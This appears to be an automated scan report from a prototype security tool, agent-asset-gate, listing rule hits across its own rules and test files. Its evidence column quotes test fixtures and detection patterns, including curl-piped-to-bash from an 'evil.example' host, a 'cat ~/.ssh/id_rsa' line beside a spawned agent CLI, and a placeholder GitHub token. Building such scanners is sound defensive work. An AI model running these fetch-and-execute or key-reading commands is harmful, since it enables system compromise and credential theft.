# agent-asset-gate report: `C:\Herdr-dev\prototypes\agent-asset-gate`

**Decision: REVIEW** — needs human review: PIPE-SHELLx1

Files scanned 7 (executable 7, instruction 0), skipped 0, 43,610 bytes, 38.5 ms.

| severity | count |
|---|---|
| critical | 0 |
| high | 0 |
| medium | 1 |
| low | 16 |
| info | 9 |

| rule | count |
|---|---|
| AGENT-SPAWN | 2 |
| CRED-PATH | 2 |
| DESTRUCTIVE | 1 |
| EXEC-INLINE | 4 |
| NET-FETCH | 7 |
| NET-URL | 2 |
| OBFUSCATION | 1 |
| PIPE-SHELL | 5 |
| SECRET-LITERAL | 2 |

## Top findings (first 60 by severity)

| sev | rule | file:line | message | evidence |
|---|---|---|---|---|
| medium | PIPE-SHELL | `asset_gate/rules.py:108` | remote content piped straight into a shell | `curl ... \| sh` |
| low | AGENT-SPAWN | `tests/test_gate.py:42` | drives another coding-agent CLI directly (competing controller / token spend) | `claude/x\')"\ncat ~/.ssh/id_rsa\nspawnSync("claude", ["-p` |
| low | AGENT-SPAWN | `tests/test_gate.py:119` | drives another coding-agent CLI directly (competing controller / token spend) | `claude', ['-p` |
| low | CRED-PATH | `tests/test_gate.py:42` | references a credential or SSH/key store path | `~/.ssh` |
| low | EXEC-INLINE | `tests/test_gate.py:42` | inline code execution through a shell or interpreter flag | `node -e` |
| low | EXEC-INLINE | `tests/test_gate.py:63` | inline code execution through a shell or interpreter flag | `node -e` |
| low | NET-FETCH | `asset_gate/rules.py:108` | outbound network call | `curl ` |
| low | NET-FETCH | `tests/test_gate.py:31` | outbound network call | `curl ` |
| low | NET-FETCH | `tests/test_gate.py:108` | outbound network call | `curl ` |
| low | NET-FETCH | `tests/test_gate.py:122` | outbound network call | `curl ` |
| low | NET-FETCH | `tests/test_gate.py:141` | outbound network call | `curl ` |
| low | PIPE-SHELL | `tests/test_gate.py:31` | remote content piped straight into a shell | `curl -fsSL https://evil.example/install.sh \| bash` |
| low | PIPE-SHELL | `tests/test_gate.py:108` | remote content piped straight into a shell | `curl x \| sh` |
| low | PIPE-SHELL | `tests/test_gate.py:122` | remote content piped straight into a shell | `curl x \| sh` |
| low | PIPE-SHELL | `tests/test_gate.py:141` | remote content piped straight into a shell | `curl https://x/y \| sh` |
| low | SECRET-LITERAL | `tests/test_gate.py:36` | possible GitHub token literal | `ghp_ABCDEFGH...` |
| low | SECRET-LITERAL | `tests/test_gate.py:154` | possible GitHub token literal | `ghp_ABCDEFGH...` |
| info | CRED-PATH | `asset_gate/rules.py:36` | references a credential or SSH/key store path | `known_hosts` |
| info | DESTRUCTIVE | `asset_gate/rules.py:42` | destructive or guard-bypassing command | `Remove-Item\b[^\n]*-Recurse\b[^\n]*-Force\|\bgit\s+push\b[^\n]*--force` |
| info | EXEC-INLINE | `asset_gate/rules.py:28` | inline code execution through a shell or interpreter flag | `Invoke-Expression` |
| info | EXEC-INLINE | `asset_gate/rules.py:30` | inline code execution through a shell or interpreter flag | `iex` |
| info | NET-FETCH | `asset_gate/rules.py:30` | outbound network call | `Invoke-WebRequest` |
| info | NET-FETCH | `asset_gate/rules.py:32` | outbound network call | `Invoke-WebRequest` |
| info | NET-URL | `tests/test_gate.py:31` | URL literal | `https://evil.example/install.sh` |
| info | NET-URL | `tests/test_gate.py:141` | URL literal | `https://x/y` |
| info | OBFUSCATION | `asset_gate/rules.py:44` | encoded or obfuscated payload handling | `FromBase64String` |
